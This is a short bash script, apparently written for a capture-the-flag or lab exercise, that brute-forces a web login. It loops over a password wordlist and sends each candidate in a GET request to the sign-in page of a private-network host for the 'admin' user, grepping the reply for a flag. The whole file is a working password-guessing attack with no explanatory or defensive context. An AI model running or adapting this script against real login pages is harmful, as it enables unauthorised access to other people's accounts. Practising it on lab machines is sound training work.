#!/usr/bin/bash

ip_address="192.168.56.101"

while read -r line
do
  echo "Trying password : $line"
  curl -s -X GET "http://$ip_address/?page=signin&username=admin&password=$line&Login=Login#" | grep flag
done < "./wordlist.txt"
